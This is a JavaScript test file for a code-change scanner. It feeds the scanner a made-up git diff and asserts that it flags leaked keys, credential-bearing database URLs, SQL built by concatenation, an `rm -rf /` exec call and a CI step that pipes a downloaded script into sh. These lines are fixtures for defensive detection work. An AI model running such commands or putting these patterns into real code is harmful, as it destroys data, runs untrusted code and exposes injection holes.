const assert = require('assert');
const { scan } = require('../out/aiGuard/scanner.js');
const diff = `diff --git a/src/db.ts b/src/db.ts
--- a/src/db.ts
+++ b/src/db.ts
@@ -1,0 +2,6 @@
+const key = "AKIAABCDEFGHIJKLMNOP";
+const url = "postgres://admin:s3cr3tpass@db.example.com/app";
+const api_key = "q8Zr2LmXv9TpWk3Nd7Ya";
+const placeholder_secret = "your-secret-here-xx";
+exec("rm -rf / ");
+db.query("SELECT * FROM users WHERE id=" + id);
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -3,0 +4,1 @@
+  run: curl https://x.sh | sh
diff --git a/.gitignore b/.gitignore
--- a/.gitignore
+++ b/.gitignore
@@ -2,1 +1,0 @@
-.env
diff --git a/old.ts b/old.ts
deleted file mode 100644
--- a/old.ts
+++ /dev/null
@@ -1,1 +0,0 @@
-x
`;
const f = scan({ diff, untracked: ['.env', '.env.example', 'keys/server.pem'] });
const rules = f.map((x) => x.rule + '@' + x.file);
console.log(rules.join('\n'));
const has = (r, file) => assert(rules.some((x) => x.startsWith(r) && (!file || x.endsWith(file))), 'faltou ' + r);
has('secret:aws-key'); has('secret:db-url'); has('secret:generic'); has('rm-rf'); has('sql-concat');
has('curl-pipe-sh'); has('gitignore-secret'); has('sensitive-file', '.env'); has('sensitive-file', 'keys/server.pem'); has('sensitive-area', '.github/workflows/ci.yml');
assert(!rules.includes('sensitive-file@.env.example'), '.env.example não deve alertar');
assert(!f.some((x) => x.rule === 'secret:generic' && /placeholder/.test(x.snippet || '')), 'placeholder não deve alertar');
assert(f.every((x) => !/AKIAABCDEFGHIJKLMNOP/.test(x.snippet || '')), 'segredo deve vir mascarado');
console.log('OK', f.length, 'achados');
